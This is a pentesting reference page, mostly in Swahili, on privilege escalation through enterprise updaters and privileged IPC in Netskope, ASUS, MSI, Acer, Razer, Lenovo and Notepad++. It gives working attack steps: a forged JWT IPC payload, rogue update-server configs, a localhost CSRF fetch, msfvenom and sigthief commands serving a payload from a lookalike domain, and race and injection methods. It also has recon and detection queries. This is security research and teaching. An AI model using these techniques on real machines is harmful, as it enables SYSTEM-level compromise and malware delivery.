# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unazalisha kwa ujumla darasa la local privilege escalation chains za Windows zinazopatikana katika enterprise endpoint agents na updaters ambazo hutoa low-friction IPC surface na privileged update flow. Mfano wa kuwakilisha ni Netskope Client for Windows < R129 (CVE-2025-0309), ambapo user mwenye low privilege anaweza kulazimisha enrollment kwenda kwa server inayodhibitiwa na attacker na kisha kuwasilisha malicious MSI ambayo service ya SYSTEM huinstall.

Mawazo muhimu unayoweza kutumia dhidi ya bidhaa zinazofanana:
- Abuse privileged service’s localhost IPC ili kulazimisha re-enrollment au reconfiguration kwenda kwa attacker server.
- Implement update endpoints za vendor, deliver a rogue Trusted Root CA, na point updater kwenda kwenye malicious, “signed” package.
- Evade weak signer checks (CN allow-lists), optional digest flags, na lax MSI properties.
- Ikiwa IPC ni “encrypted”, derive the key/IV kutoka world-readable machine identifiers zilizohifadhiwa kwenye registry.
- Ikiwa service inazuia callers kwa image path/process name, inject into an allow-listed process au spawn moja suspended na bootstrap DLL yako kupitia minimal thread-context patch.

---
## 1) Kulazimisha enrollment kwenda kwa attacker server kupitia localhost IPC

Wengi wa agents husafirisha user-mode UI process ambayo huwasiliana na SYSTEM service kupitia localhost TCP kwa kutumia JSON.

Ilionekana katika Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Craft token ya JWT enrollment ambayo claims zake hudhibiti backend host (mfano, AddonUrl). Tumia alg=None ili hakuna signature inayohitajika.
2) Tuma IPC message ikiiita provisioning command pamoja na JWT yako na tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Huduma inaanza kugonga rogue server yako kwa enrollment/config, kwa mfano:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Ikiwa caller verification ni path/name-based, anzisha request kutoka kwenye allow-listed vendor binary (ona §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Mara client inapoongea na server yako, implement expected endpoints na uielekeze kwenye attacker MSI. Typical sequence:

1) /v2/config/org/clientconfig → Rudisha JSON config yenye updater interval fupi sana, kwa mfano:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Rudisha PEM CA certificate. Huduma huiinstall kwenye Local Machine Trusted Root store.
3) /v2/checkupdate → Toa metadata inayoelekeza kwenye malicious MSI na fake version.

Kuepuka common checks zinazoonekana kwa wingi:
- Signer CN allow-list: huduma inaweza tu kucheck kama Subject CN ni “netSkope Inc” au “Netskope, Inc.”. Rogue CA yako inaweza kutoa leaf yenye hiyo CN na kusign MSI.
- CERT_DIGEST property: jumuisha benign MSI property inayoitwa CERT_DIGEST. Hakuna enforcement wakati wa install.
- Optional digest enforcement: config flag (kwa mfano, check_msi_digest=false) huzima extra cryptographic validation.

Matokeo: SYSTEM service huiinstall MSI yako kutoka
C:\ProgramData\Netskope\stAgent\data\*.msi
na ku-execute arbitrary code kama NT AUTHORITY\SYSTEM.

Patch-bypass lesson: vendor akijibu kwa ku-allow-list seti ndogo ya “trusted” domains badala ya ku-authenticate source ya update kwa cryptographically, tafuta vendor-owned redirectors au reverse proxies zinazokuruhusu bado steer traffic. Katika Netskope's case, public follow-up research ilionyesha kwamba R129-era allow-list bado ingeweza kutumiwa vibaya kupitia `rproxy.goskope.com`, ambayo iliproxy attacker-controlled Azure App Service content. Chukulia hostname allow-lists kama speed bump, si kama trust boundary.

---
## 3) Forging encrypted IPC requests (when present)

Kuanzia R127, Netskope ilizungushia IPC JSON ndani ya field ya encryptData inayoonekana kama Base64. Reversing ilionyesha AES yenye key/IV zilizotokana na registry values zinazosomeka na user yeyote:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers wanaweza ku-reproduce encryption na kutuma valid encrypted commands kutoka standard user. Tip ya jumla: ikiwa agent ghafla “encrypts” IPC yake, tafuta device IDs, product GUIDs, install IDs chini ya HKLM kama material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Baadhi ya services hujaribu ku-authenticate peer kwa ku-resolve PID ya TCP connection na kulinganisha image path/name dhidi ya allow-listed vendor binaries zilizo chini ya Program Files (kwa mfano, stagentui.exe, bwansvc.exe, epdlp.exe).

Mbinu mbili za practical bypass:
- DLL injection ndani ya allow-listed process (kwa mfano, nsdiag.exe) na proxy IPC kutoka ndani yake.
- Spawn allow-listed binary suspended na bootstrap proxy DLL yako bila CreateRemoteThread (ona §5) ili satisfy driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products mara nyingi husafirisha minifilter/OB callbacks driver (kwa mfano, Stadrv) ili ku-strip dangerous rights kutoka handles kwenda protected processes:
- Process: huondoa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: hupunguza hadi THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Reliable user-mode loader inayoheshimu constraints hizi:
1) CreateProcess ya vendor binary na CREATE_SUSPENDED.
2) Pata handles ambazo bado unaruhusiwa kuwa nazo: PROCESS_VM_WRITE | PROCESS_VM_OPERATION kwenye process, na thread handle yenye THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (au tu THREAD_RESUME ikiwa unapata code kwenye known RIP).
3) Overwrite ntdll!NtContinue (au early, guaranteed-mapped thunk nyingine) na tiny stub inayoita LoadLibraryW kwenye DLL path yako, kisha irudi nyuma.
4) ResumeThread ili ku-trigger stub yako ndani ya process, na ku-load DLL yako.

Kwa sababu hukutumia PROCESS_CREATE_THREAD wala PROCESS_SUSPEND_RESUME kwenye tayari-protected process (uli-create mwenyewe), policy ya driver inaridhika.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) hu-automate rogue CA, malicious MSI signing, na huhudumia endpoints zinazohitajika: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope ni custom IPC client inayo-craft arbitrary (optionally AES-encrypted) IPC messages na kujumuisha suspended-process injection ili ku-origin kutoka kwenye allow-listed binary.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Unapokutana na endpoint agent mpya au motherboard “helper” suite, workflow ya haraka mara nyingi inatosha kukuambia kama unaangalia promising privesc target:

1) Enumerate loopback listeners na uzi-map kurudi kwa vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Hesabu candidate named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Chimba data ya routing inayotegemea registry inayotumiwa na IPC servers za plugin-based:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Toa majina ya endpoint, JSON keys, na command IDs kwanza kutoka kwa user-mode client. Packed Electron/.NET frontends mara nyingi huvuja full schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Tafuta predicate halisi ya trust, si tu code path ambayo hatimaye huzindua process:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patterns zinazostahili kupewa kipaumbele:
- `CryptQueryObject`/certificate parsing bila `WinVerifyTrust` kwa kawaida humaanisha “certificate ipo” ilichukuliwa kama “certificate inatambulika”, na hivyo kuwezesha certificate cloning au hila nyingine za fake-signer.
- Ukaguzi wa substring/suffix juu ya `Origin`, `Referer`, download URLs, majina ya process, au signer CNs si authentication. `contains(".vendor.com")` kwa kawaida inaweza kutumiwa vibaya na attacker-controlled lookalike domains.
- Ikiwa low-privileged GUI huamua “the file is trusted” na SYSTEM broker huchukua tu matokeo hayo, kupatch au kuireimplement client-side DLL/JS mara nyingi hupita boundary nzima kabisa (Razer-style split validation).
- Ikiwa broker hunakili payload kwenda `%TEMP%`/`C:\Windows\Temp` kisha hui-validate au kuischedule kutoka path hiyo, jaribu mara moja TOCTOU replacement windows na sibling plugin modules zinazofichua alternate `ExecuteTask()` wrappers zenye checks dhaifu zaidi.

Kwa targets zenye named-pipe nyingi, PipeViewer ni njia ya haraka ya kubaini weak DACLs na pipes zinazoweza kufikiwa kwa mbali kabla hujaanza ku-reverse protocol kwa kina.

Ikiwa target huwatambua callers kwa PID, image path, au process name pekee, chukulia hiyo kama speed bump badala ya boundary: injecting ndani ya legitimate client, au kufanya connection kutoka kwa process iliyo kwenye allow-list, mara nyingi inatosha kukidhi checks za server. Kwa named pipes hasa, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) inaeleza primitive hiyo kwa kina zaidi.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)

Tofauti mpya inayostahili kuwindwa ni **signed-client RPC broker**: low-privileged Lenovo-signed desktop process huongea na SYSTEM service, na service hu-route JSON commands kwenda seti ya add-ins zilizoelezwa kwa XML chini ya `%ProgramData%`. Mara code execution ikifanikiwa **ndani ya accepted signed client yoyote**, kila `runas="system"` contract inakuwa sehemu ya attack surface yako.

High-value primitives zilizoonekana katika utafiti wa Lenovo Vantage:
- **Kumuamini caller kwa sababu imesainiwa na vendor**: watafiti walifikia authenticated context kwa kunakili Lenovo-signed EXE kwenda directory inayoweza kuandikwa na kukidhi DLL side-load (`profapi.dll`) ili arbitrary code iendeshe ndani ya client ambayo service tayari ilimuamini.
- **Manifest-driven attack surface discovery**: add-ins hutangazwa chini ya `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; contracts kadhaa huendeshwa kama `SYSTEM`, kwa hiyo ku-enumerate manifests hizo mara nyingi huonyesha verbs za kweli zenye privileges haraka kuliko ku-reverse broker yenyewe.
- **Per-command bugs nyuma ya authenticated channel**: mara ukiwa ndani ya trusted client, public research ilipata path-traversal + race conditions katika update/install verbs, raw-SQL abuse katika privileged settings databases, na substring-based registry path checks zilizowezesha writes nje ya intended hive.

Useful recon kwenye target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Practical takeaway: wakati wowote helper suite inafichua broker ambayo kwanza huthibitisha **caller process** kisha ndipo husambaza amri nyingi za plugin/add-in, usisitishe baada ya bypass ya front-door trust check. Dump manifest/contract table na fuzz kila high-privilege verb kwa kujitegemea; authenticated channel kawaida huficha bugs kadhaa za second-stage.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub inasafirisha user-mode HTTP service (ADU.exe) kwenye 127.0.0.1:53000 ambayo inatarajia browser calls zinazoja kutoka https://driverhub.asus.com. Origin filter kwa urahisi hufanya `string_contains(".asus.com")` juu ya header ya Origin na juu ya download URLs zilizofichuliwa na `/asus/v1.0/*`. Hivyo host yoyote inayodhibitiwa na attacker kama `https://driverhub.asus.com.attacker.tld` hupita check na inaweza kutoa state-changing requests kutoka JavaScript. Tazama [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) kwa bypass patterns za ziada.

Practical flow:
1) Register domain inayojumuisha `.asus.com` na host malicious webpage hapo.
2) Tumia `fetch` au XHR kuita privileged endpoint (kwa mfano, `Reboot`, `UpdateApp`) kwenye `http://127.0.0.1:53000`.
3) Tuma JSON body inayotarajiwa na handler – packed frontend JS inaonyesha schema hapa chini.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Hata PowerShell CLI iliyoonyeshwa hapa chini pia hufaulu wakati kichwa cha Origin kinapoigizwa kuwa thamani inayoaminika:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

To weaponize the flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL, CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker-controlled arguments.

The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 added another useful pattern to this family: a low-privileged user can ask a COM helper to launch a process through `RzUtility.Elevator`, while the trust decision is delegated to a user-mode DLL (`simple_service.dll`) rather than being enforced robustly inside the privileged boundary.

Observed exploitation path:
- Instantiate the COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` to request an elevated launch.
- In the public PoC, the PE-signature gate inside `simple_service.dll` is patched out before issuing the request, allowing an arbitrary attacker-chosen executable to be launched.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Takeaway ya jumla: unapochambua suites za “helper”, usiishie kwenye localhost TCP au named pipes. Angalia COM classes zenye majina kama `Elevator`, `Launcher`, `Updater`, au `Utility`, kisha hakikisha kama huduma yenye privileji kweli ina-validati binary lengwa yenyewe au inamwamini tu matokeo yaliyokokotolewa na user-mode client DLL inayoweza kubadilishwa. Pattern hii inaenea zaidi ya Razer: muundo wowote uliogawanywa ambapo high-privilege broker inapokea allow/deny decision kutoka upande wa low-privilege ni candidate wa privesc surface.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Kati ya June 2025 na December 2025, attackers waliodhibiti hosting infrastructure nyuma ya Notepad++ update flow walihudumia selectively malicious manifests kwa victims waliolengwa. Older WinGUp-based updaters hazikuthibitisha kikamilifu update authenticity, hivyo hostile XML response iliweza kuelekeza clients kwenye attacker-controlled URLs. Kwa kuwa client ilikubali HTTPS content bila kutekeleza both a trusted certificate chain na valid PE signature kwenye installer iliyopakuliwa, victims walipakua na kuendesha trojanized NSIS `update.exe`.

Operational flow (no local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting na jibu update checks kwa attacker metadata inayoelekeza kwenye malicious download URL.
2. **Trojanized NSIS**: installer inapakua/inatekeleza payload na kutumia execution chains mawili:
- **Bring-your-own signed binary + sideload**: bundle signed Bitdefender `BluetoothService.exe` na drop malicious `log.dll` kwenye search path yake. Wakati signed binary inaendeshwa, Windows sideloads `log.dll`, ambayo decrypts na reflectively loads Chrysalis backdoor (Warbird-protected + API hashing kuzuia static detection).
- **Scripted shellcode injection**: NSIS inaendesha compiled Lua script inayotumia Win32 APIs (k.m. `EnumWindowStationsW`) ku-inject shellcode na stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** ya installer iliyopakuliwa (pin vendor signer, reject mismatched CN/chain) na sign update manifest yenyewe (k.m. XMLDSig). Block manifest-controlled redirects unless validated.
- Chukulia **BYO signed binary sideloading** kama post-download detection pivot: alert wakati signed vendor EXE inapopakia DLL name kutoka nje ya canonical install path yake (k.m. Bitdefender kupakia `log.dll` kutoka Temp/Downloads) na wakati updater ina-drop/execute installers kutoka temp zenye non-vendor signatures.
- Monitor **malware-specific artifacts** zilizoonekana kwenye chain hii (zinafaa kama generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, na Lua-driven shellcode injection stages.
- Notepad++ ilijibu kwa kuimarisha WinGUp katika v8.8.9 na baadae: returned XML sasa imesainiwa (XMLDSig), na newer builds zinatekeleza certificate + signature verification ya installer iliyopakuliwa badala ya kuamini transport pekee.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> ikizindua kisakinishi kisicho cha Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Mitindo hii inajumlisha kwa updater yoyote inayokubali unsigned manifests au inashindwa kuweka pin signers za installer—network hijack + malicious installer + BYO-signed sideloading hutoa remote code execution chini ya mwavuli wa “trusted” updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
